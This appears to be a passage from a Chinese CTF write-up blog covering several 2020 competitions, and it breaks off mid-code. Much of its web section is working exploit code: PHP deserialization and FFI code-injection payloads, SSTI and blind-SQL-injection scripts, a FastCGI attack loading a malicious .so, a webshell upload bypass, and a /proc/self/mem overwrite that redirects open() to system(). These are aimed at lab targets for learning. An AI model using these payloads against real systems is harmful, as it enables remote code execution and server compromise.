/flag&#x27;,&#x27;object&#x27;=&gt;&#x27;phpinfo&#x27;); &#125;&#125;$a=serialize(new pop());$a=str_replace(&#x27;&quot;pop&quot;:1:&#x27;, &#x27;&quot;pop&quot;:2:&#x27;,$a);echo base64_encode($a); RCEME查看源码 提示.swp .index.php.swp存在 恢复得到源码 12345678910111213141516171819202122&lt;?phperror_reporting(0);session_start();if(!isset($_SESSION[&#x27;code&#x27;]))&#123; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5);&#125;if(isset($_POST[&#x27;cmd&#x27;]) and isset($_POST[&#x27;code&#x27;]))&#123; if(substr(md5($_POST[&#x27;code&#x27;]),0,5) !== $_SESSION[&#x27;code&#x27;])&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Captcha error~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5); $code = $_POST[&#x27;cmd&#x27;]; if(strlen($code) &gt; 70 or preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/ixm&#x27;,$code))&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Longlone not like you~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $code))&#123; @eval($code); die(); &#125;&#125;?&gt; 无字目数字 + 无参RCE 直接用这个脚本生成 1234567891011121314def one(s): ss = &quot;&quot; for each in s: ss += &quot;%&quot; + str(hex(255 - ord(each)))[2:].upper() return f&quot;[~&#123;ss&#125;][!%FF](&quot;while 1: a = &#x27;system(next(getallheaders()));&#x27; aa = a.split(&quot;(&quot;) s = &quot;&quot; for each in aa[:-1]: s += one(each) s += &quot;)&quot; * (len(aa) - 1) + &quot;;&quot; print(s) 相当于 1[&#39;system&#39;][false]([&#39;next&#39;][false]([getallheaders][false]())); X迪的pyp语言访问hint.php得到源码 123456789101112131415161718192021222324252627282930313233343536373839import refrom flask import Flask, render_template_string, requestimport templates.templates as tpapp = Flask(__name__)def isParamLegal(param): return (re.search(r&#x27;&#123;&#123;.*&#125;&#125;|&#123;%.*%&#125;&#x27;, param, re.M|re.S) is None)@app.route(&#x27;/&#x27;) @app.route(&#x27;/index.php&#x27;) def main(): indexTp = tp.head + tp.index + tp.foot return render_template_string(indexTp)@app.route(&#x27;/login.php&#x27;, methods=[&quot;POST&quot;])def login(): username = request.form.get(&#x27;username&#x27;) password = request.form.get(&#x27;password&#x27;) if(isParamLegal(username) and isParamLegal(password)): message = &quot;Username:&quot; + username + &quot;&amp;&quot; + &quot;Password:&quot; + password else: message = &quot;参数不合法&quot; loginTmpTp = tp.head + tp.login + tp.foot loginTp = loginTmpTp % message return render_template_string(loginTp)@app.route(&quot;/hint.php&quot;)def hint(): with open(__file__, &quot;rb&quot;) as f: file = f.read() return fileif __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;) greatphp源码： 12345678910111213141516171819202122232425 &lt;?phperror_reporting(0);class SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123; unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 之前在nu1l星球看到了wp 利用Eception绕过hash比较 exp： 12345678910111213&lt;?phperror_reporting(0);class SYCLOVER &#123; public $syc; public $lover;&#125;$command = &#x27;require~&#x27;.~&#x27;/flag&#x27;.&#x27;;?&gt;&#x27;;$ex1 = new Exception($command);$ex2 = new Exception($command,1); // 同一行$exp = new SYCLOVER();$exp-&gt;syc = $ex1;$exp-&gt;lover = $ex2;echo urlencode(serialize($exp)); FighterFightsInvincibly查看源码发现 传phpinfo 1?fighter&#x3D;call_user_func&amp;fights&#x3D;phpinfo&amp;invincibly&#x3D;1000 disable_function 1system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,socket_connect,stream_socket_server,stream_socket_accept,stream_socket_client,ftp_connect,ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,posix_getegid,posix_geteuid,posix_getgid,posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_getpwnam,posix_getpwuid,posix_getrlimit,posix_getsid,posix_getuid,posix_isatty,posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname open_basedir php7.4 开了FFI 没过滤create_function 直接代码注入 1fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;&#125;$e&#x3D;FFI::cdef(&quot;int system(const char *command);&quot;,&quot;libc.so.6&quot;);$e-&gt;system($_REQUEST[&#39;cmd&#39;]);&#x2F;*&amp;cmd&#x3D;sleep 3 FFI中可以直接调用php源码中的函数,php_exec的type为3时对应的是passthru,直接将结果原始输出 这样可以延时 无回显 但是靶机不能出网 没办法 只能换一种方式 1fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;;&#125;$ffi &#x3D; FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$ffi-&gt;php_exec(3,&quot;cat &#x2F;run.sh&quot;);&#x2F;* 还有种payload: 1fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;;&#125;$ffi &#x3D; FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o &#x3D; $ffi-&gt;popen(&quot;&#x2F;readflag&quot;,&quot;r&quot;);$d &#x3D; &quot;&quot;;while(($c &#x3D; $ffi-&gt;fgetc($o)) !&#x3D; -1)&#123;$d .&#x3D; str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);&#x2F;* misc一“页”障目海报上三块拼一下 壮言壮语佛曰解密就行：http://www.keyfc.net/bbs/tools/tudoucode.aspx 秘技·反复横跳binwalk分离出一张二维码 随便拼一下就行了 来拼图crypto二战情报员刘壮摩斯密码解密：https://www.atool99.com/morse.php 按照要求 去掉_ 加上SYC&#123;&#125;就行 铠甲与萨满凯撒密码直接解密就行 成都养猪二厂reNo RE no gainida打开 程序流程图中看到flag 我真不会写驱动！同样是IDA打开 在伪代码中找到flag re00查看伪代码 发现是异或0x44 并且异或的结果数组内容 取出来 exp: 1234567chars=[0x17,0x1D,0x07,0x3F,0x37,0x2D,0x29,0x34,0x28,0x21,0x1B,0x37,0x2D,0x29,0x34,0x28,0x21,0x1B,0x3C,0x2B,0x36,0x36,0x36,0x1B,0x36,0x2D,0x23,0x2C,0x30,0x7B,0x7B,0x39]print(len(chars))flag=&#x27;&#x27;for i in range(len(chars)): flag+=chr(chars[i]^0x44)print(flag) pwn数学咋样？写脚本就完事了 123456789101112131415161718from pwn import *import rep=remote(&#x27;81.69.0.47&#x27;,&#x27;1111&#x27;)i=0while i&lt;21: print p.recv() s=p.recv() print s r=re.search(r&quot;num_1 = (\\d+), num_2 = (\\d+)&quot;,s) num1=int(r.group(1)) print num1 num2=int(r.group(2)) print num2 num=num1+num2 p.sendline(str(num)) p.sendline() i+=1","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"西湖论剑2020部分writeup","slug":"西湖论剑2020部分writeup","date":"2020-10-13T09:28:31.000Z","updated":"2020-10-17T12:24:51.288Z","comments":true,"path":"2020/10/13/西湖论剑2020部分writeup/","link":"","permalink":"http://www.moonback.xyz/2020/10/13/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020%E9%83%A8%E5%88%86writeup/","excerpt":"tcl!日常自闭😭","text":"tcl!日常自闭😭 web集中式网盘系统宝塔 apache防火墙 赵总np! 文件头检测 gif好像不行 换png可以穿上 或者这样 连接的时候访问%25a.php waf url解码出错绕过上传 穿上还连不上 哭了 找到：https://github.com/AntSwordProject/AwesomeEncoder 用的是base64加密 shell模板 1&lt;?php @eval(base64_decode($_POST[&#x27;ant&#x27;]));?&gt; 改下特征很明显的UA 在modules/request.js 接着就该绕disable_function和open_basedir了 加载lua脚本： 12345678910111213141516require &quot;string&quot;function handle(r) r.content_type = &quot;text/plain&quot; local t = io.popen(&#x27;/readflag&#x27;) local a = t:read(&quot;*all&quot;) r:puts(a) if r.method == &#x27;GET&#x27; then for k, v in pairs( r:parseargs() ) do r:puts( string.format(&quot;%s: %s\\n&quot;, k, v) ) end else r:puts(&quot;Unsupported HTTP method &quot; .. r.method) endend 上传.htaccess 1AddHandler lua-script .lua 直接访问lua脚本就能getflag 或者攻击fastcgi加载恶意so exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128&lt;?php error_reporting(0);class Client&#123; const VERSION_1 = 1; const BEGIN_REQUEST = 1; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const RESPONDER = 1; protected $keepAlive = false; protected $_requests = array(); protected $_requestCounter = 0; protected function buildPacket($type, $content, $requestId = 1) &#123; $offset = 0; $totLen = strlen($content); $buf = &#x27;&#x27;; do &#123; // Packets can be a maximum of 65535 bytes $part = substr($content, $offset, 0xffff - 8); $segLen = strlen($part); $buf .= chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($segLen &gt;&gt; 8) &amp; 0xFF) /* contentLengthB1 */ . chr($segLen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $part; /* content */ $offset += $segLen; &#125; while ($offset &lt; $totLen); return $buf; &#125; protected function buildNvpair($name, $value) &#123; $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) &#123; /* nameLengthB0 */ $nvpair = chr($nlen); &#125; else &#123; /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); &#125; if ($vlen &lt; 128) &#123; /* valueLengthB0 */ $nvpair .= chr($vlen); &#125; else &#123; /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); &#125; /* nameData &amp; valueData */ return $nvpair . $name . $value; &#125; protected function readNvpair($data, $length = null) &#123; if ($length === null) &#123; $length = strlen($data); &#125; $array = array(); $p = 0; while ($p != $length) &#123; $nlen = ord($data&#123;$p++&#125;); if ($nlen &gt;= 128) &#123; $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $nlen |= (ord($data&#123;$p++&#125;)); &#125; $vlen = ord($data&#123;$p++&#125;); if ($vlen &gt;= 128) &#123; $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $vlen |= (ord($data&#123;$p++&#125;)); &#125; $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); &#125; return $array; &#125; public function buildAllPacket(array $params, $stdin) &#123; // Ensure new requestID is not already being tracked do &#123; $this-&gt;_requestCounter++; if ($this-&gt;_requestCounter &gt;= 65536 /* or (1 &lt;&lt; 16) */) &#123; $this-&gt;_requestCounter = 1; &#125; $id = $this-&gt;_requestCounter; &#125; while (isset($this-&gt;_requests[$id])); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;keepAlive) . str_repeat(chr(0), 5), $id); $paramsRequest = &#x27;&#x27;; foreach ($params as $key =&gt; $value) &#123; $paramsRequest .= $this-&gt;buildNvpair($key, $value, $id); &#125; if ($paramsRequest) &#123; $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest, $id); &#125; $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;, $id); if ($stdin) &#123; $request .= $this-&gt;buildPacket(self::STDIN, $stdin, $id); &#125; $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;, $id); return $request; &#125;&#125;$sock = stream_socket_client(&quot;unix:///tmp/php-cgi-74.sock&quot;, $errno, $errstr);$client = new Client();$payload_file = &quot;/www/wwwroot/10.20.124.208/sandbox/g4e0iupg8df1gombtbs2pkadl1/upload/1.php&quot;;$params = array( &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27; =&gt; $payload_file, &#x27;PHP_ADMIN_VALUE&#x27; =&gt; &quot;extension_dir = /tmp\\nextension = mb.so&quot;, //这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名);$data = $client-&gt;buildAllPacket($params, &#x27;&#x27;);fwrite($sock, $data);var_dump(fread($sock, 4096));antsystem(&#x27;/readflag&#x27;);?&gt; 将https://github.com/AntSwordProject/ant_php_extension 编译成so文件上传到/tmp 注意php版本要一样 kali安装phpsize 1apt install php7.4-dev 这样我们就有个antsystem函数可以用来执行命令了 Easyjson源码： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpinclude &#x27;security.php&#x27;;if(!isset($_GET[&#x27;source&#x27;]))&#123; show_source(__FILE__); die();&#125;$sandbox = &#x27;sandbox/&#x27;.sha1($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]).&#x27;/&#x27;;var_dump($sandbox);if(!file_exists($sandbox))&#123; mkdir($sandbox); file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;);&#125;$action = $_GET[&#x27;action&#x27;];$content = file_get_contents(&quot;php://input&quot;);if($action == &quot;write&quot; &amp;&amp; SecurityCheck(&#x27;filename&#x27;,$_GET[&#x27;filename&#x27;]) &amp;&amp;SecurityCheck(&#x27;content&#x27;,$content))&#123; $content = json_decode($content); $filename = $_GET[&#x27;filename&#x27;]; $filecontent = $content-&gt;content; $filename = $sandbox.$filename; file_put_contents($filename,$filecontent.&quot;\\n Powered By Dbapp OSS.&quot;);&#125;elseif($action == &quot;reset&quot;)&#123; $files = scandir($sandbox); foreach($files as $file) &#123; if(!is_dir($file))&#123; if($file !== &quot;index.php&quot;)&#123; unlink($sandbox.$file); &#125; &#125; &#125;&#125;else&#123; die(&#x27;Security Check Failed.&#x27;);&#125; 直接unicode编码绕过: unicode部分是： 1&#123;&quot;content&quot;:&quot;&lt;?php system(&#39;&#x2F;readflag&#39;);?&gt;&quot;&#125; getshell后没什么限制直接拿flag了 Flagshop抓包会发现一个任意文件读取 php伪协议读源码 123456789101112131415// backend.php?readfile=php://filter/convert.base64-encode/resource=backend.php&lt;?php$offset = isset($_GET[&#x27;offset&#x27;]) ? $_GET[&#x27;offset&#x27;] : 0;$buffer = isset($_GET[&#x27;buffer&#x27;]) ? $_GET[&#x27;buffer&#x27;] : &quot;&quot;;if (isset($_GET[&#x27;writefile&#x27;])) &#123; $fp = fopen($_GET[&#x27;writefile&#x27;], &quot;a&quot;); fseek($fp, $offset); fwrite($fp, $buffer); fclose($fp);&#125;if (isset($_GET[&#x27;readfile&#x27;])) &#123; echo file_get_contents($_GET[&#x27;readfile&#x27;]);&#125; 这题是读内存 写内存 linux万物皆是文件 webpwn：https://github.com/beched/php_disable_functions_bypass 读/proc/self/maps 该文件包含了当前进程映射的内存区域以及它们的访问权限 查看动态链接库的位置 1strings maps | grep &quot;libc-&quot; 并记录libc的地址 接着读/lib/x86_64-linux-gnu/libc-2.19.so 并查看system函数的地址 动态链接库的地址加上system的偏移就能计算出system函数的地址。 1234&lt;?phpecho dechex(0x7ffff5f40000+0x0000000000046590);// 0x7ffff5f86590?&gt; 计算open函数的偏移 需要/proc/pid/exe文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpfunction packlli($value) &#123; $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32; $lower = $value &amp; 0x00000000ffffffff; return pack(&#x27;V2&#x27;, $lower, $higher);&#125;function unp($value) &#123; return hexdec(bin2hex(strrev($value)));&#125;function parseelf($bin_ver, $rela = false) &#123; $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, 0x28, 8)); $e_shentsize = unp(substr($bin, 0x3a, 2)); $e_shnum = unp(substr($bin, 0x3c, 2)); $e_shstrndx = unp(substr($bin, 0x3e, 2)); for($i = 0; $i &lt; $e_shnum; $i += 1) &#123; $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4)); if($sh_type == 11) &#123; // SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); &#125; elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) &#123; // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); &#125; elseif($rela &amp;&amp; $sh_type == 4) &#123; // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); &#125; &#125; if($rela) &#123; for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) &#123; $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = &#x27;&#x27;; $j = $strtab_off + $name_off - 1; while($bin[++$j] != &quot;\\0&quot;) &#123; $name .= $bin[$j]; &#125; if($name == &#x27;open&#x27;) &#123; return $r_offset; &#125; &#125; &#125; else &#123; for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) &#123; $name_off = unp(substr($bin, $i, 4)); $name = &#x27;&#x27;; $j = $strtab_off + $name_off - 1; while($bin[++$j] != &quot;\\0&quot;) &#123; $name .= $bin[$j]; &#125; if($name == &#x27;__libc_system&#x27;) &#123; $system_offset = unp(substr($bin, $i + 8, 8)); &#125; if($name == &#x27;__open&#x27;) &#123; $open_offset = unp(substr($bin, $i + 8, 8)); &#125; &#125; return array($system_offset, $open_offset); &#125;&#125;$open_php = parseelf(&#x27;exe&#x27;, true);echo $open_php;//结果：15333784?&gt; /proc/self/mem文件是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。 我们知道system函数的地址，我们就可以将open函数的地址替换为system函数的地址，我们在file_get_contents传入参数为系统命令实际执行的却是system函数，将readflag的结果输出到文件。 构造payload: 1backend.php?readfile&#x3D;&#x2F;readflag&gt;&#x2F;tmp&#x2F;mb&amp;writefile&#x3D;&#x2F;proc&#x2F;self&#x2F;mem&amp;buffer&#x3D;%90%65%f8%f5%ff%7f&amp;offset&#x3D;15333784 捋下思路 向/proc/self/mem文件即内存 open函数(file_get_contents会调用该方法)的地址位置写入system的地址 从而实现调用file_get_contents函数调用system函数的作用 cryptoBrokenSystems维纳攻击得到d 根据d求p q 生成私钥解密加密文件 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPimport osimport gmpy2from Crypto.Util.number import *import random import syssys.setrecursionlimit(1000000)def rational_to_contfrac (x, y): &#x27;&#x27;&#x27; Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] &#x27;&#x27;&#x27; a = x//y if a * y == x: return [a] else: pquotients = rational_to_contfrac(y, x - a * y) pquotients.insert(0, a) return pquotientsdef convergents_from_contfrac(frac): &#x27;&#x27;&#x27; computes the list of convergents using the list of partial quotients &#x27;&#x27;&#x27; convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0:i])) return convsdef contfrac_to_rational (frac): &#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an] to an x/y rational. &#x27;&#x27;&#x27; if len(frac) == 0: return (0,1) elif len(frac) == 1: return (frac[0], 1) else: remainder = frac[1:len(frac)] (num, denom) = contfrac_to_rational(remainder) # fraction is now frac[0] + 1/(num/denom), which is # frac[0] + denom/num. return (frac[0] * num + denom, num)def egcd(a,b): &#x27;&#x27;&#x27; Extended Euclidean Algorithm returns x, y, gcd(a,b) such that ax + by = gcd(a,b) &#x27;&#x27;&#x27; u, u1 = 1, 0 v, v1 = 0, 1 while b: q = a // b u, u1 = u1, u - q * u1 v, v1 = v1, v - q * v1 a, b = b, a - q * b return u, v, adef gcd(a,b): &#x27;&#x27;&#x27; 2.8 times faster than egcd(a,b)[2] &#x27;&#x27;&#x27; a,b=(b,a) if a&lt;b else (a,b) while b: a,b=b,a%b return adef modInverse(e,n): &#x27;&#x27;&#x27; d such that de = 1 (mod n) e must be coprime to n this is assumed to be true &#x27;&#x27;&#x27; return egcd(e,n)[0]%ndef totient(p,q): &#x27;&#x27;&#x27; Calculates the totient of pq &#x27;&#x27;&#x27; return (p-1)*(q-1)def bitlength(x): &#x27;&#x27;&#x27; Calculates the bitlength of x &#x27;&#x27;&#x27; assert x &gt;= 0 n = 0 while x &gt; 0: n = n+1 x = x&gt;&gt;1 return ndef isqrt(n): &#x27;&#x27;&#x27; Calculates the integer square root for arbitrary large nonnegative integers &#x27;&#x27;&#x27; if n &lt; 0: raise ValueError(&#x27;square root not defined for negative numbers&#x27;) if n == 0: return 0 a, b = divmod(bitlength(n), 2) x = 2**(a+b) while True: y = (x + n//x)//2 if y &gt;= x: return x x = ydef is_perfect_square(n): &#x27;&#x27;&#x27; If n is a perfect square it returns sqrt(n), otherwise returns -1 &#x27;&#x27;&#x27; h = n &amp; 0xF; #last hexadecimal &quot;digit&quot; if h &gt; 9: return -1 # return immediately in 6 cases out of 16. # Take advantage of Boolean short-circuit evaluation if ( h != 2 and h != 3 and h != 5 and h != 6 and h != 7 and h != 8 ): # take square root if you must t = isqrt(n) if t*t == n: return t else: return -1 return -1def hack_RSA(e,n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n if(discr&gt;=0): t = is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(&quot;\\nHacked!&quot;) return drsakey=RSA.importKey(open(&quot;public.key&quot;,&quot;r&quot;).read())n=rsakey.ne=rsakey.eprint(n,e)d=hack_RSA(e,n)print (&quot;d=&quot;)print (d)def getpq(n,e,d): p = 1 q = 1 while p==1 and q==1: k = d * e - 1 g = random.randint ( 0 , n ) while p==1 and q==1 and k % 2 == 0: k //= 2 y = pow(g,k,n) if y!=1 and gcd(y-1,n)&gt;1: p = gcd(y-1,n) q = n//p return p,qp,q=getpq(n,e,d)f=open(&quot;message&quot;,&quot;rb&quot;)rsa_components=(n,e,int(d),p,q)arsa=RSA.construct(rsa_components)rsakey = RSA.importKey(arsa.exportKey()) rsakey = PKCS1_OAEP.new(rsakey)decrypted = rsakey.decrypt(f.read()) print(decrypted) 参考： http://www.plasf.cn/articles/d5a07c1f3f.html","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"巅峰极客2020 部分题目writeup","slug":"巅峰极客2020-wp","date":"2020-09-26T08:25:39.000Z","updated":"2020-10-01T11:36:26.441Z","comments":true,"path":"2020/09/26/巅峰极客2020-wp/","link":"","permalink":"http://www.moonback.xyz/2020/09/26/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-wp/","excerpt":"四道题做了三道还行！🤭","text":"四道题做了三道还行！🤭 webbabybacksql注入，fuzz一下，发现过滤了 1union and select &#39; &quot; - &#x3D; like &amp; mid 过滤单双引号，马上想到\\，发现可以布尔盲注，盲猜密码字段为password，exp: 1234567891011121314151617181920212223242526272829import requestsurl=&quot;http://eci-2zedr7xc8tymr58mx2vp.cloudeci1.ichunqiu.com/index.php&quot;flag=&#x27;&#x27;for i in range(1,500): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 data=&#123;&#x27;username&#x27;:&#x27;admin\\\\&#x27;,&#x27;password&#x27;:&#x27;or if((ord(substr(password,&#123;&#125;,1))&gt;&#123;&#125;),1,0)#&#x27;.format(str(i),str(mid))&#125; data1=&#123;&#x27;username&#x27;:&#x27;admin\\\\&#x27;,&#x27;password&#x27;:&#x27;or if((ord(substr(password,&#123;&#125;,1)) in (&#123;&#125;)),1,0)#&#x27;.format(str(i),str(mid))&#125; try: r1=requests.post(url,data=data1) print(i,mid) if len(r1.text)!=2984: flag+=chr(mid) print(flag) break r=requests.post(url,data=data) if len(r.text)==2984: top=mid-1 if len(r.text)!=2984: low=mid+1 except Exception as e: pass if flag==f1: breakprint(flag) 注出密码为uAreRigHt，登陆发现是个代码执行 1eval($command.&quot;=false&quot;); 并且过滤了 1空格 ^ &#39; &quot; ( 可以直接包含，payload，取反部分为/flag: 1command&#x3D;include~%D0%99%93%9E%98?&gt; babyflask登陆的地方同户名ssti，前端js验证 直接p神的payload就可以打： 1234567891011loged?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; babyphp2扫目录发现www.zip,classes.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158&lt;?phperror_reporting(0);session_start();class User&#123; public $id; public $age=null; public $nickname=null; public $backup; public function login() &#123; if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login(); if($this-&gt;id)&#123; $_SESSION[&#x27;id&#x27;]=$this-&gt;id; $_SESSION[&#x27;login&#x27;]=1; echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;]; echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;]; echo &quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;&lt;/script&gt;&quot;; &#125; &#125;&#125; public function upload()&#123; $uploader=new Upload(); $uploader-&gt;upload(); &#125; public function read()&#123; $reader=new reader(); $reader-&gt;read($_POST[&#x27;filename&#x27;]); &#125; public function __toString() &#123; $this-&gt;nickname-&gt;backup=$this-&gt;backup; $user = new User(); $user-&gt;id = $_SESSION[&#x27;id&#x27;]; $user-&gt;nickname = $_SESSION[&#x27;token&#x27;]; return serialize($user); &#125;&#125;class dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;p3rh4ps&quot;; public $dbpass=&quot;p3rh4ps&quot;; public $database=&quot;p3rh4ps&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST[&#x27;username&#x27;]; $this-&gt;password=$_POST[&#x27;password&#x27;]; &#125; public function login() &#123; $this-&gt;mysqli=new 